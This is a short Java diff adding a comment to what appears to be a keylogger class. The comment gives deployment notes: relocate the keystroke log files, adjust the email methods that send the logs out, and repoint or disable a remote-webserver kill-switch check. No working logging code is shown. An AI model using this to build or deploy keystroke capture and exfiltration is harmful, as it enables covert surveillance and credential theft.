@@ -20,6 +20,20 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 
 public class Main implements NativeKeyListener
 {
+	/**
+	 * In the record(String x) method, you may change the location of the
+	 * keystroke log files from the default (C:/ClassPolicy) to a different location
+	 * to support systems with a different location for storing files or a different filesystem
+	 * (i.e. Apple HFS, *nix ext4) 
+	 * 
+	 * In doing so, please change the file location for transfer in Radio's email methods
+	 * in order to allow the files to be sent. 
+	 * 
+	 * During a deployment, please also change the isSuicune() method to refer to a different
+	 * webserver, as it is currently just pointing to a sample GitHub page containing that information,
+	 * or disable it if it is blocked by the firewall or unneeded. (return false)
+	 * 
+	 */
 	static Stopwatch robert = null;
 	public Main()
 	{
